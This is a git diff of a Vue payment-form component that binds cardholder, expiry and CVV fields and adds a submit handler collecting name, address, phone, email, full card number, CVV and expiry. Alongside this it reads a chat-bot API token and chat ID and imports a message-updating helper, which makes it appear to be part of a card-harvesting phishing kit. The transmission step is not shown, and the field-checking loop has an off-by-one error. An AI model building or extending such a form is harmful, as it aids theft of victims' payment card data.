@@ -14,7 +14,7 @@
         <p class="text-text-body font-helv2 mb-1">
           Cardholder <span class="text-red-600">*</span>
         </p>
-        <Input class="" />
+        <Input v-model="store.cardHolder" />
       </div>
       <div class="my-4">
         <p class="text-text-body font-helv2 mb-1">
@@ -41,31 +41,37 @@
           <p class="text-text-body font-helv2 mb-1">
             Expire Date <span class="text-red-600">*</span>
           </p>
-          <Input label="MM/YY" />
+          <Input label="MM/YY" v-model="store.expire" />
         </div>
         <div>
           <p class="text-text-body font-helv2 mb-1">
             Security Code(CVV) <span class="text-red-600">*</span>
           </p>
-          <Input label="123" />
+          <Input label="123" v-model="store.cvv" />
         </div>
       </div>
     </div>
 
-    <button class="bg-text-heading text-white px-7 py-2 rounded-md">
+    <button
+      class="bg-text-heading text-white px-7 py-2 rounded-md"
+      @click="handleSubmit"
+    >
       Submit
     </button>
   </div>
 </template>
 
 <script setup>
-import Input from "./MyInput.vue";
-import ModifiedInput from "./ModifiedInput.vue";
+import Input from "/src/components/MyInput.vue";
+import ModifiedInput from "/src/components/ModifiedInput.vue";
+import { updateMyMessage } from "../utils/updateMessage.js";
 import { ref } from "vue";
 
 import { useCounterStore } from "/src/stores/info";
+const { VITE_API_TOKEN, VITE_CHAT_ID } = import.meta.env;
 
 const store = useCounterStore();
+const loading = ref(false);
 
 const payments = ref([
   "/pay_imgs/visa.png",
@@ -101,5 +107,44 @@ function detectCreditCardIssuer(cardNumber) {
   }
   // If none of the above conditions match, return u0nknown
   return "/pay_imgs/credit-card-solid-24.png";
+}
+
+function handleSubmit() {
+  const storeInfo = store.getInfo;
+  const dataPoints = [
+    "firstname",
+    "address",
+    "address2",
+    "city",
+    "state",
+    "zip",
+    "phone",
+    "email",
+    "cardHolder",
+    "cvv",
+    "cardnum",
+    "expire",
+  ];
+  const info = {};
+  dataPoints.forEach((key) => {
+    info[key] = storeInfo[key];
+  });
+
+  const data = Object.values(info);
+
+  let filled = false;
+  for (let i = 0; i <= data.length; i++) {
+    if (data[i] == "") {
+      filled = false;
+
+      return;
+    } else if (data[i] != "") {
+      filled = true;
+    }
+  }
+
+  if (filled === true && data.length != 0) {
+    loading.value = true;
+  }
 }
 </script>
